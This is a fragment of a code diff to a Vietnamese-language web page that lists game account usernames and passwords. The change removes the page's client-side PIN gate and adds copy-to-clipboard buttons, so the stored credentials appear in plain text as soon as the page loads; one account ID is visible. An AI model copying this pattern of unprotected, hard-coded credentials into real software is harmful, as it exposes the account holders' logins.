             { game: "Black Myth Wukong (TK2)", user: "8782146147", pass: "N/A", platform: "Game" },
         ];
 
-        function checkPin() {
-            const pinInput = document.getElementById('pin-input').value;
-            const messageElement = document.getElementById('pin-message');
-
-            if (pinInput === CORRECT_PIN) {
-                // Pin is correct
-                sessionStorage.setItem(SESSION_KEY, 'true');
-                messageElement.classList.add('hidden');
-                loadAccountList();
-            } else {
-                // Pin is incorrect
-                messageElement.textContent = "Mã PIN không đúng. Vui lòng thử lại.";
-                messageElement.classList.remove('hidden');
-                document.getElementById('pin-input').value = '';
-                document.getElementById('pin-input').focus();
-            }
-        }
-
-        function loadAccountList() {
-            document.getElementById('pin-gate').classList.add('hidden');
-            const accountListElement = document.getElementById('account-list');
-            const dataContainer = document.getElementById('data-container');
-            accountListElement.classList.remove('hidden');
-
-            dataContainer.innerHTML = SENSITIVE_DATA.map(item => `
-                <div class="data-card p-4 rounded-xl flex flex-col sm:flex-row justify-between items-start sm:items-center">
-                    <div class="w-full sm:w-1/3 mb-3 sm:mb-0">
-                        <span class="block text-xs font-semibold uppercase text-gray-400">Trò chơi / Ghi chú</span>
-                        <span class="text-lg font-bold text-indigo-300">${item.game}</span>
-                        <span class="block text-sm text-gray-500 mt-1">(${item.platform})</span>
+        function renderData() {
+            const container = document.getElementById('data-container');
+            container.innerHTML = SENSITIVE_DATA.map((item, index) => `
+                <div class="data-card p-4 rounded-xl flex flex-col gap-3">
+                    <div>
+                        <div class="text-xs text-indigo-400 font-bold uppercase tracking-widest mb-1">${item.platform}</div>
+                        <div class="font-bold text-lg text-white">${item.game}</div>
                     </div>
-
-                    <div class="w-full sm:w-1/3 mb-3 sm:mb-0">
-                        <span class="block text-xs font-semibold uppercase text-gray-400">Tài khoản (TK/User)</span>
-                        <code class="text-base mono text-green-300 break-all">${item.user}</code>
-                    </div>
-
-                    <div class="w-full sm:w-1/3">
-                        <span class="block text-xs font-semibold uppercase text-gray-400">Mật khẩu (MK/Pass)</span>
-                        <code class="text-base mono text-red-300 break-all">${item.pass}</code>
+                    
+                    <div class="grid grid-cols-2 gap-2 mt-2">
+                        <div class="bg-slate-800 p-2 rounded border border-slate-700">
+                            <span class="block text-[10px] text-gray-500 uppercase font-bold">Tài khoản</span>
+                            <div class="mono text-green-400 text-sm truncate" id="user-${index}">${item.user}</div>
+                            <button onclick="copyText('user-${index}', this)" class="mt-2 w-full bg-slate-700 hover:bg-slate-600 text-[10px] py-1 rounded transition-colors uppercase font-bold">Copy</button>
+                        </div>
+                        <div class="bg-slate-800 p-2 rounded border border-slate-700">
+                            <span class="block text-[10px] text-gray-500 uppercase font-bold">Mật khẩu</span>
+                            <div class="mono text-red-400 text-sm truncate" id="pass-${index}">${item.pass}</div>
+                            <button onclick="copyText('pass-${index}', this)" class="mt-2 w-full bg-slate-700 hover:bg-slate-600 text-[10px] py-1 rounded transition-colors uppercase font-bold">Copy</button>
+                        </div>
                     </div>
                 </div>
             `).join('');
         }
 
-        // Check authentication state on page load
-        window.onload = function() {
-            if (sessionStorage.getItem(SESSION_KEY) === 'true') {
-                loadAccountList();
+        async function copyText(id, btn) {
+            const text = document.getElementById(id).innerText;
+            if(text === "N/A") return;
+            try {
+                await navigator.clipboard.writeText(text);
+                const originalText = btn.innerText;
+                btn.innerText = "COPIED!";
+                btn.style.backgroundColor = "#10b981";
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.style.backgroundColor = "";
+                }, 1000);
+            } catch (err) {
+                console.error('Lỗi:', err);
             }
-            // Add Enter key listener to the input
-            document.getElementById('pin-input').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    checkPin();
-                }
-            });
-        };
+        }
+
+        function copyCode(id) {
+            const code = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(code);
+            alert("Đã sao chép mã nguồn Python!");
+        }
+
+        window.onload = renderData;
     </script>
 </body>
 </html>
-
